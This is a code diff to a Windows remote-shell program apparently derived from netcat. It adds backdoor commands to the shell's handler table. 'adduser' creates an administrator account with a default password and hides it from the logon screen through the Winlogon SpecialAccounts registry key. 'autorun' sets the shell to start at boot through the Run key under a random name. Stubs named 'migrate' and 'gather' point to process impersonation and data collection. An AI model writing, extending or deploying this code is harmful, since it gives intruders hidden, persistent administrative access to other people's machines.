@@ -5,10 +5,11 @@
 
 // portions Copyright (C) 1994 Nathaniel W. Mishkin
 // code taken from rlogind.exe
-
+#include <stdio.h>
 #include <stdlib.h>
 #include <winsock2.h>
-#include <winbase.h>
+#include <windows.h>
+#include <shlwapi.h>
 
 #ifdef GAPING_SECURITY_HOLE
 
@@ -366,6 +367,8 @@ static VOID
 	BYTE    Buffer2[BUFFER_SIZE*2+30];
 	DWORD   BytesRead;
 
+	// srand((unsigned int)time(NULL));
+
 	// this bogus peek is here because win32 won't let me close the pipe if it is
 	// in waiting for input on a read.
 	while (PeekNamedPipe(Session->ReadPipeHandle, Buffer, sizeof(Buffer), 
@@ -427,6 +430,8 @@ static VOID
 	BYTE    Buffer[BUFFER_SIZE];
 	DWORD   BytesWritten;
 	DWORD   BufferCnt;
+
+	srand((unsigned int)time(NULL));
 
 	BufferCnt = 0;
 
@@ -550,14 +555,131 @@ static int getpid_handler(int s, int argc, char* argv[])
 	return 0;
 }
 
+static const char* get_exe_name()
+{
+	static char exename[MAX_PATH + 1] = {0};
+	if (exename[0] == 0) {
+		GetModuleFileName(NULL, exename, MAX_PATH);
+	}
+
+	return exename;
+}
+
+static const char* get_randon_str()
+{
+	static char buf[32];
+	int i;
+	int n = 5 + rand() % 6;
+	
+	for (i = 0; i < n ; i ++) {
+		buf[i] = 'a' + (rand() % 26);
+	}
+	buf[n] = 0;
+	return buf;
+}
+
+static int adduser_handler(int s, int argc, char* argv[])
+{
+	char cmd[256];
+	const char* user = "admin";
+	const char* passwd = "abcdefg";
+	HUSKEY hKey;
+	DWORD v = 0;
+
+	if (argc > 1)
+		user = argv[1];
+	if (argc > 2)
+		passwd = argv[2];
+	
+	sprintf(cmd, "net user %s %s /add", user, passwd);
+	if (system(cmd) == 0) {
+		sprintf(cmd, "net localgroup administrators %s /add", user);
+		if (system(cmd) != 0)
+			xshell_printf(s, "Cannot add %s to administators\n", user);
+	} else {
+		xshell_printf(s, "Cannot add user: %s\n", user);
+		return -1;
+	}
+
+	SHRegCreateUSKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList", 
+		KEY_WRITE, NULL, &hKey, SHREGSET_HKLM);
+	if (hKey) {
+		SHRegWriteUSValue(hKey, user, REG_DWORD, &v, sizeof(v), SHREGSET_FORCE_HKLM);
+		SHRegCloseUSKey(hKey);
+		xshell_printf(s, "Succecced\n");
+	} else {
+		xshell_printf(s, "Failed\n");
+	}
+	return 0;
+}
+
 struct _handlers {
 	char* cmd;
 	cmd_handler handler;
 };
 
+static int autorun_handler(int s, int argc, char* argv[])
+{
+	const char* name, *regv;
+	char cmd[MAX_PATH];
+	char type = 'B';
+	int port = 1888;
+	HUSKEY hKey;
+	if (argc > 1) {
+		type = argv[1][0];
+		if (type != 'b' && type != 'B')
+			type = 'B';
+	}
+
+	if (argc > 2) {
+		port = atoi(argv[2]);
+	}
+
+	SHRegCreateUSKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
+		KEY_WRITE, NULL, &hKey, SHREGSET_HKLM);
+	if (hKey) {
+		name = get_exe_name();
+		regv = get_randon_str();
+		sprintf(cmd, "%s -%c %d", name, type, port);
+		SHRegWriteUSValue(hKey, regv, REG_SZ, cmd, strlen(cmd), SHREGSET_FORCE_HKLM);
+		SHRegCloseUSKey(hKey);
+		xshell_printf(s, "Succecced. Name: %s\n", regv);
+	} else {
+		xshell_printf(s, "Failed\n");
+	}
+
+	return 0;
+}
+
+static int migrate_handler(int s, int argc, char* argv[])
+{
+	// attach/create a process, and impersonate it
+	const char* exename = "mmc.exe";
+	DWORD pid = 0;
+	if (argc > 1)
+		exename = argv[1];
+	pid = atol(exename);
+	if (pid == 0) {
+		// create process
+	} else {
+		// attach process
+	}
+
+	return 0;
+}
+
+static int gather_handler(int s, int argc, char* argv[])
+{
+	return 0;
+}
+
 struct _handlers handlers[] = {
 	{"help", help_handler}, 
+	{"adduser", adduser_handler}, 
 	{"getpid", getpid_handler}, 
+	{"autorun", autorun_handler}, 
+	{"migrate", migrate_handler},  
+	{"gather", gather_handler},  
 };
 
 cmd_handler find_cmd_handler(char* name)
